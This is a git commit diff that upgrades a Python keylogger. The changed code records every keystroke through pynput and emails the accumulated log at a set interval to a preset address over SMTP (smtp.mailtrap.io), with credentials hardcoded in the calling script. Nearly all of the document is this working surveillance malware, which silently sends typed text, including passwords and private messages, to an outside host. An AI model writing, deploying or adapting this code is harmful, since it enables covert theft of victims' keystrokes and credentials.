5fbf2bea1b3bfeccc62d40558802e1da00cb6988
Robert Paruch <roobbb@live.com>
2020-07-13 18:24:19 -0700

    Updated keylogger

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,31 +1,49 @@
 import pynput.keyboard
 import threading
-
-log = ''
+import smtplib
 
 
 class Keylogger:
+    def __init__(self, time_interval, username, password, email, start=True):
+        self.log = 'Keylogger started'
+        self.interval = time_interval
+        self.username = username
+        self.password = password
+        self.email = email
+        if start:
+            self.start()
 
-    def process_kay_press(self, key):
-        global log
+    def applend_to_log(self, string):
+        self.log += string
+
+    def process_key_press(self, key):
         try:
-            log += str(key.char)
+            current_key = key.char
         except AttributeError:
             if key == key.space:
-                log += ' '
+                current_key = ' '
             else:
-                log += f' {key} '
+                current_key = f' {key} '
+        self.applend_to_log(current_key)
+
+    def send_mail(self, username, password, email, message):
+        server = smtplib.SMTP('smtp.mailtrap.io', 2525)
+        server.starttls()
+        server.login(username, password)
+        server.sendmail(email, email, message)  # sender, receiver, message
+        server.quit()
 
     def report(self):
-        global log
-        print(log)
-        log = ''
-        timer = threading.Timer(5, self.report)
+        if self.log:
+            self.log = f'\n\n{self.log}'
+            self.send_mail(self.username, self.password, self.email, self.log)
+            self.log = ''
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(
-            on_press=self.process_kay_press)
+            on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
--- keylogger/zlogger.py
+++ keylogger/zlogger.py
@@ -1,4 +1,4 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger()
-my_keylogger.start()
+my_keylogger = keylogger.Keylogger(
+    120, 'b06ffc432e3884', 'a5e72032e9c491', 'to@smtp.mailtrap.io')
